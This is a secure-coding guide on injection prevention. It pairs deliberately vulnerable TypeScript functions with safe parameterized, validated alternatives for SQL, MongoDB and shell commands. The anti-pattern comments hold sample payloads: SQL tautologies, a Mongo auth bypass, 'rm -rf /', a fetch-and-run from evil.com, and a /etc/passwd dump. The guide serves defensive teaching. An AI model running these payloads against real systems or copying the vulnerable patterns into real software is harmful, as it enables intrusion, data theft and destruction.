# Injection Prevention

Never concatenate untrusted input into queries, commands, or code. Use parameterized queries, prepared statements, and safe APIs to prevent SQL injection, NoSQL injection, and command injection attacks.

## Why This Matters

Injection vulnerabilities allow attackers to execute arbitrary code or commands:
- **SQL Injection**: Attacker reads, modifies, or deletes entire database contents
- **NoSQL Injection**: Bypasses authentication, extracts sensitive data, or corrupts documents
- **Command Injection**: Executes arbitrary OS commands, leading to full system compromise
- **Data Breach**: Stolen customer data, credentials, and business secrets
- **Ransomware**: Encrypted systems held for ransom via injected commands

A single injection vulnerability can compromise your entire infrastructure. Injection attacks consistently rank in OWASP Top 10 most critical security risks.

## Anti-Patterns to Avoid

### ❌ NEVER: String Concatenation in SQL Queries

```typescript
// ❌ NEVER: Concatenate user input into SQL
async function getUserByEmail(email: string) {
  const query = `SELECT * FROM users WHERE email = '${email}'`;
  // Attacker sends: ' OR '1'='1
  // Executes: SELECT * FROM users WHERE email = '' OR '1'='1'
  // Returns all users!
  return db.query(query);
}

// ❌ NEVER: Template literals with user input
async function deleteUser(userId: string) {
  await db.query(`DELETE FROM users WHERE id = ${userId}`);
  // Attacker sends: 1 OR 1=1
  // Deletes all users!
}

// ❌ NEVER: Dynamic WHERE clauses
async function searchProducts(category: string, minPrice: string) {
  const query = `
    SELECT * FROM products
    WHERE category = '${category}'
    AND price >= ${minPrice}
  `;
  // Attacker sends category: ' OR '1'='1' --
  // Bypasses price filter and returns all products
  return db.query(query);
}
```

**Risk:** Critical - Complete database compromise, data theft, data deletion

---

### ❌ NEVER: Query Object Injection in NoSQL

```typescript
// ❌ NEVER: Pass user input directly to MongoDB queries
async function login(email: string, password: any) {
  const user = await db.collection('users').findOne({
    email: email,
    password: password, // password could be object!
  });
  // Attacker sends: { $ne: null }
  // Finds first user where password is not null (bypasses auth!)
  return user;
}

// ❌ NEVER: User input in $where operator
async function searchUsers(query: string) {
  return db.collection('users').find({
    $where: `this.username.includes('${query}')`,
    // Attacker sends: '); return true; //
    // Executes arbitrary JavaScript!
  }).toArray();
}

// ❌ NEVER: Unvalidated query operators
async function getUsers(filter: any) {
  // filter could contain dangerous operators: { $where: ... }
  return db.collection('users').find(filter).toArray();
}
```

**Risk:** Critical - Authentication bypass, arbitrary code execution, data theft

---

### ❌ NEVER: Shell Command Injection

```typescript
import { exec } from 'child_process';

// ❌ NEVER: Concatenate user input into shell commands
async function convertImage(filename: string) {
  exec(`convert ${filename} output.png`);
  // Attacker sends: image.jpg; rm -rf /
  // Deletes entire filesystem!
}

// ❌ NEVER: Template literals in exec
async function backupFile(filepath: string) {
  exec(`tar -czf backup.tar.gz ${filepath}`);
  // Attacker sends: file.txt && curl evil.com/malware.sh | bash
  // Downloads and executes malware!
}

// ❌ NEVER: Unvalidated input to system commands
async function pingHost(hostname: string) {
  exec(`ping -c 4 ${hostname}`);
  // Attacker sends: google.com & cat /etc/passwd > public/passwords.txt
  // Exfiltrates sensitive system files!
}
```

**Risk:** Critical - Complete system compromise, data exfiltration, malware execution

---

### ❌ NEVER: Dynamic SQL Column/Table Names from User Input

```typescript
// ❌ NEVER: User input in column names
async function sortUsers(sortBy: string) {
  const query = `SELECT * FROM users ORDER BY ${sortBy}`;
  // Attacker sends: (SELECT CASE WHEN (password LIKE 'a%') THEN 1 ELSE 2 END)
  // Extracts passwords via timing attacks!
  return db.query(query);
}

// ❌ NEVER: User input in table names
async function getTableData(tableName: string) {
  return db.query(`SELECT * FROM ${tableName}`);
  // Attacker sends: users WHERE 1=1 UNION SELECT * FROM admin_secrets --
  // Accesses unauthorized tables!
}
```

**Risk:** High - Data exfiltration, unauthorized access, information disclosure

---

## Correct Patterns

### ✅ ALWAYS: Use Parameterized Queries (SQL)

```typescript
import { Pool } from 'pg';

const pool = new Pool();

// ✅ Parameterized query with placeholders
async function getUserByEmail(email: string): Promise<User | null> {
  const result = await pool.query(
    'SELECT * FROM users WHERE email = $1',
    [email] // Parameters safely escaped
  );
  return result.rows[0] || null;
}

// ✅ Multiple parameters
async function createUser(email: string, username: string, passwordHash: string) {
  const result = await pool.query(
    'INSERT INTO users (email, username, password_hash) VALUES ($1, $2, $3) RETURNING *',
    [email, username, passwordHash]
  );
  return result.rows[0];
}

// ✅ Complex WHERE clauses with parameters
async function searchProducts(
  category: string,
  minPrice: number,
  maxPrice: number
): Promise<Product[]> {
  const result = await pool.query(
    `SELECT * FROM products
     WHERE category = $1
     AND price BETWEEN $2 AND $3
     ORDER BY price ASC`,
    [category, minPrice, maxPrice]
  );
  return result.rows;
}

// ✅ Dynamic conditions with parameterized queries
async function searchUsersWithFilters(filters: {
  email?: string;
  role?: string;
  isActive?: boolean;
}): Promise<User[]> {
  const conditions: string[] = [];
  const params: any[] = [];
  let paramIndex = 1;

  if (filters.email) {
    conditions.push(`email = $${paramIndex}`);
    params.push(filters.email);
    paramIndex++;
  }

  if (filters.role) {
    conditions.push(`role = $${paramIndex}`);
    params.push(filters.role);
    paramIndex++;
  }

  if (filters.isActive !== undefined) {
    conditions.push(`is_active = $${paramIndex}`);
    params.push(filters.isActive);
    paramIndex++;
  }

  const whereClause = conditions.length > 0
    ? 'WHERE ' + conditions.join(' AND ')
    : '';

  const query = `SELECT * FROM users ${whereClause}`;
  const result = await pool.query(query, params);
  return result.rows;
}
```

**Benefit:** SQL injection impossible - all user input safely escaped by database driver

---

### ✅ ALWAYS: Use ORM with Parameterized Queries (Prisma)

```typescript
import { PrismaClient } from '@prisma/client';

const prisma = new PrismaClient();

// ✅ Prisma automatically parameterizes queries
async function getUserByEmail(email: string) {
  return prisma.user.findUnique({
    where: { email }, // Safely parameterized
  });
}

// ✅ Complex queries are safe
async function searchProducts(
  category: string,
  minPrice: number,
  searchTerm: string
) {
  return prisma.product.findMany({
    where: {
      category: category,
      price: { gte: minPrice },
      OR: [
        { name: { contains: searchTerm } },
        { description: { contains: searchTerm } },
      ],
    },
    orderBy: { price: 'asc' },
  });
}

// ✅ Raw queries with parameters
async function customQuery(userId: string) {
  // Use $1, $2 placeholders for parameterization
  return prisma.$queryRaw`
    SELECT * FROM orders
    WHERE user_id = ${userId}
    AND created_at > NOW() - INTERVAL '30 days'
  `;
}

// ✅ NEVER use Prisma.sql() with concatenation
async function dangerousCustomQuery(sortColumn: string) {
  // ❌ DON'T DO THIS - SQL injection possible
  // return prisma.$queryRawUnsafe(`SELECT * FROM users ORDER BY ${sortColumn}`);

  // ✅ Instead, validate and whitelist
  const allowedColumns = ['email', 'created_at', 'username'] as const;
  if (!allowedColumns.includes(sortColumn as any)) {
    throw new Error('Invalid sort column');
  }

  // Safe after validation
  return prisma.$queryRawUnsafe(`SELECT * FROM users ORDER BY ${sortColumn}`);
}
```

**Benefit:** Type-safe queries that automatically prevent SQL injection

---

### ✅ ALWAYS: Validate Types for NoSQL Queries (MongoDB)

```typescript
import { MongoClient, ObjectId } from 'mongodb';
import { z } from 'zod';

const client = new MongoClient(process.env.MONGODB_URL!);
const db = client.db('myapp');

// ✅ Type validation prevents object injection
async function login(email: string, password: string): Promise<User | null> {
  // ✅ Validate inputs are strings, not objects
  const emailSchema = z.string().email();
  const passwordSchema = z.string();

  const validEmail = emailSchema.parse(email);
  const validPassword = passwordSchema.parse(password);

  const user = await db.collection('users').findOne({
    email: validEmail,
    password: validPassword, // Now guaranteed to be string
  });

  return user;
}

// ✅ Validate and whitelist query operators
const QueryFilterSchema = z.object({
  email: z.string().email().optional(),
  role: z.enum(['USER', 'ADMIN', 'MODERATOR']).optional(),
  isActive: z.boolean().optional(),
  createdAfter: z.coerce.date().optional(),
});

async function searchUsers(rawFilter: unknown) {
  // ✅ Parse and validate - removes any $where or dangerous operators
  const filter = QueryFilterSchema.parse(rawFilter);

  const query: any = {};

  if (filter.email) {
    query.email = filter.email; // String only
  }

  if (filter.role) {
    query.role = filter.role; // Enum only
  }

  if (filter.isActive !== undefined) {
    query.isActive = filter.isActive; // Boolean only
  }

  if (filter.createdAfter) {
    query.createdAt = { $gte: filter.createdAfter }; // Controlled operator
  }

  return db.collection('users').find(query).toArray();
}

// ✅ Validate ObjectId format
async function getUserById(id: string) {
  // ✅ Validate is valid ObjectId
  if (!ObjectId.isValid(id)) {
    throw new Error('Invalid user ID format');
  }

  return db.collection('users').findOne({
    _id: new ObjectId(id), // Safe ObjectId construction
  });
}

// ✅ NEVER use $where operator - use safe alternatives
async function searchUsersByName(searchTerm: string) {
  // ❌ DON'T DO THIS - Code injection possible
  // db.collection('users').find({ $where: `this.name.includes('${searchTerm}')` })

  // ✅ Use regex with escaped input
  const escapedTerm = searchTerm.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  return db.collection('users').find({
    name: { $regex: escapedTerm, $options: 'i' },
  }).toArray();
}
```

**Benefit:** Type validation prevents object injection and operator injection attacks

---

### ✅ ALWAYS: Use Safe Command Execution APIs (execFile, spawn)

```typescript
import { execFile, spawn } from 'child_process';
import { promisify } from 'util';
import { z } from 'zod';

const execFileAsync = promisify(execFile);

// ✅ Use execFile instead of exec - no shell interpretation
async function convertImage(inputFile: string, outputFile: string): Promise<void> {
  // ✅ Validate filename format
  const filenameSchema = z.string().regex(/^[a-zA-Z0-9_.-]+$/);
  const validInput = filenameSchema.parse(inputFile);
  const validOutput = filenameSchema.parse(outputFile);

  // ✅ execFile passes arguments as array - no shell injection
  await execFileAsync('convert', [validInput, validOutput]);
  // Even if validInput is "file.jpg; rm -rf /", it's treated as literal filename
}

// ✅ spawn with argument array
async function compressFile(filepath: string): Promise<void> {
  // ✅ Validate filepath
  const pathSchema = z.string().regex(/^[a-zA-Z0-9_.\/-]+$/);
  const validPath = pathSchema.parse(filepath);

  return new Promise((resolve, reject) => {
    // ✅ Arguments as array - no shell interpretation
    const child = spawn('gzip', [validPath]);

    child.on('error', reject);
    child.on('close', (code) => {
      if (code === 0) {
        resolve();
      } else {
        reject(new Error(`gzip exited with code ${code}`));
      }
    });
  });
}

// ✅ Whitelist allowed commands
const ALLOWED_COMMANDS = {
  convert: '/usr/bin/convert',
  gzip: '/usr/bin/gzip',
  tar: '/usr/bin/tar',
} as const;

type AllowedCommand = keyof typeof ALLOWED_COMMANDS;

async function runCommand(
  command: AllowedCommand,
  args: string[]
): Promise<string> {
  // ✅ Validate command is in whitelist
  const commandPath = ALLOWED_COMMANDS[command];
  if (!commandPath) {
    throw new Error(`Command ${command} not allowed`);
  }

  // ✅ Validate all arguments
  const argSchema = z.string().regex(/^[a-zA-Z0-9_.\/-]+$/);
  const validArgs = args.map(arg => argSchema.parse(arg));

  const { stdout } = await execFileAsync(commandPath, validArgs);
  return stdout;
}

// ✅ Safe ping implementation
async function pingHost(hostname: string): Promise<boolean> {
  // ✅ Validate hostname format (no special chars)
  const hostnameSchema = z.string().regex(/^[a-zA-Z0-9.-]+$/);
  const validHostname = hostnameSchema.parse(hostname);

  try {
    // ✅ execFile with argument array - no shell injection
    await execFileAsync('ping', ['-c', '4', validHostname], {
      timeout: 10000, // 10 second timeout
    });
    return true;
  } catch (error) {
    return false;
  }
}
```

**Benefit:** No shell interpretation means injection attacks are impossible

---

### ✅ ALWAYS: Validate and Whitelist Dynamic Identifiers

```typescript
import { z } from 'zod';

// ✅ Whitelist allowed sort columns
const ALLOWED_SORT_COLUMNS = ['email', 'created_at', 'username', 'updated_at'] as const;
const SortColumnSchema = z.enum(ALLOWED_SORT_COLUMNS);

async function sortUsers(sortBy: string, order: string) {
  // ✅ Validate column is in whitelist
  const validColumn = SortColumnSchema.parse(sortBy);

  // ✅ Validate order
  const OrderSchema = z.enum(['ASC', 'DESC']);
  const validOrder = OrderSchema.parse(order.toUpperCase());

  // ✅ Safe to use after validation
  const query = `SELECT * FROM users ORDER BY ${validColumn} ${validOrder}`;
  return pool.query(query);
}

// ✅ Whitelist table names with type safety
const ALLOWED_TABLES = {
  users: 'users',
  products: 'products',
  orders: 'orders',
} as const;

type TableName = keyof typeof ALLOWED_TABLES;

async function getRecordCount(tableName: TableName): Promise<number> {
  // ✅ Validated at compile-time and runtime
  const validTable = ALLOWED_TABLES[tableName];
  if (!validTable) {
    throw new Error('Invalid table name');
  }

  const result = await pool.query(`SELECT COUNT(*) FROM ${validTable}`);
  return parseInt(result.rows[0].count);
}

// ✅ Prisma with dynamic field selection
async function getUserFields(userId: string, fields: string[]) {
  // ✅ Whitelist allowed fields
  const allowedFields = ['id', 'email', 'username', 'createdAt'] as const;
  const FieldSchema = z.enum(allowedFields);

  // ✅ Validate all requested fields
  const validFields = fields.map(field => FieldSchema.parse(field));

  // ✅ Build select object
  const select = validFields.reduce((obj, field) => {
    obj[field] = true;
    return obj;
  }, {} as Record<string, boolean>);

  return prisma.user.findUnique({
    where: { id: userId },
    select,
  });
}
```

**Benefit:** Whitelisting prevents injection via dynamic identifiers

---

## Additional Safe Patterns

### ✅ Content Security Policy for XSS Prevention

```typescript
import helmet from 'helmet';
import express from 'express';

const app = express();

// ✅ Set Content Security Policy headers
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"], // No 'unsafe-inline' in production
    styleSrc: ["'self'"],
    imgSrc: ["'self'", "data:", "https:"],
    connectSrc: ["'self'"],
    fontSrc: ["'self'"],
    objectSrc: ["'none'"],
    mediaSrc: ["'self'"],
    frameSrc: ["'none'"],
  },
}));

// ✅ Additional security headers
app.use(helmet.xssFilter()); // X-XSS-Protection
app.use(helmet.noSniff()); // X-Content-Type-Options: nosniff
app.use(helmet.ieNoOpen()); // X-Download-Options: noopen
app.use(helmet.frameguard({ action: 'deny' })); // X-Frame-Options: DENY
```

---

### ✅ Safe HTML Rendering (Prevent XSS)

```typescript
import DOMPurify from 'isomorphic-dompurify';

// ✅ Sanitize HTML before rendering
function renderUserContent(userHtml: string): string {
  // ✅ Strip all dangerous tags and attributes
  const clean = DOMPurify.sanitize(userHtml, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'u', 'a'],
    ALLOWED_ATTR: ['href'],
    ALLOW_DATA_ATTR: false,
  });

  return clean;
}

// ✅ React: Use textContent for user input
function UserComment({ comment }: { comment: string }) {
  // ✅ React automatically escapes text content
  return <div>{comment}</div>;
}

// ✅ If you must render HTML, sanitize it
function UserBio({ bioHtml }: { bioHtml: string }) {
  const sanitized = DOMPurify.sanitize(bioHtml);

  // ✅ Only render after sanitization
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}
```

---

## Framework-Specific Best Practices

### ✅ Express with Prepared Statements

```typescript
import express from 'express';
import { Pool } from 'pg';
import { z } from 'zod';

const app = express();
const pool = new Pool();

// ✅ Middleware for query validation
function validateQuery<T extends z.ZodTypeAny>(schema: T) {
  return (req: express.Request, res: express.Response, next: express.NextFunction) => {
    try {
      req.query = schema.parse(req.query);
      next();
    } catch (error) {
      if (error instanceof z.ZodError) {
        return res.status(400).json({ error: 'Invalid query parameters' });
      }
      next(error);
    }
  };
}

const SearchSchema = z.object({
  q: z.string().max(100),
  category: z.string().max(50),
  page: z.coerce.number().int().min(1).default(1),
});

app.get('/api/products/search',
  validateQuery(SearchSchema),
  async (req, res) => {
    const { q, category, page } = req.query;
    const limit = 20;
    const offset = (page - 1) * limit;

    // ✅ Parameterized query
    const result = await pool.query(
      `SELECT * FROM products
       WHERE name ILIKE $1
       AND category = $2
       LIMIT $3 OFFSET $4`,
      [`%${q}%`, category, limit, offset]
    );

    res.json(result.rows);
  }
);
```

---

### ✅ MongoDB with Type Guards

```typescript
import { z } from 'zod';
import { MongoClient } from 'mongodb';

const client = new MongoClient(process.env.MONGODB_URL!);
const db = client.db('myapp');

// ✅ Type guard for query objects
function isSafeMongoQuery(query: unknown): query is Record<string, string | number | boolean> {
  if (typeof query !== 'object' || query === null) {
    return false;
  }

  // ✅ Ensure no operators or nested objects
  for (const [key, value] of Object.entries(query)) {
    // ✅ Reject operator keys
    if (key.startsWith('$')) {
      return false;
    }

    // ✅ Only allow primitive values
    const type = typeof value;
    if (type !== 'string' && type !== 'number' && type !== 'boolean') {
      return false;
    }
  }

  return true;
}

// ✅ Validate before querying
async function findUsers(filter: unknown) {
  if (!isSafeMongoQuery(filter)) {
    throw new Error('Invalid query filter');
  }

  return db.collection('users').find(filter).toArray();
}
```

---

## Pre-Deployment Checklist

Before deploying to production:

- [ ] All SQL queries use parameterized statements or ORMs
- [ ] No string concatenation or template literals in SQL queries
- [ ] MongoDB queries validate input types (no objects in query values)
- [ ] No `$where` operator used in MongoDB queries
- [ ] Commands use `execFile` or `spawn` (never `exec` with user input)
- [ ] All dynamic column/table names validated against whitelist
- [ ] File paths validated before use in commands
- [ ] Content Security Policy configured to prevent XSS
- [ ] User-generated HTML sanitized with DOMPurify
- [ ] Input validation (Zod) applied before all queries/commands
- [ ] No user input passed directly to `eval`, `Function()`, or `vm.runInNewContext`
- [ ] Regular expressions from user input properly escaped
- [ ] Database user has minimum required privileges (not root/admin)
- [ ] Code reviewed specifically for injection vulnerabilities
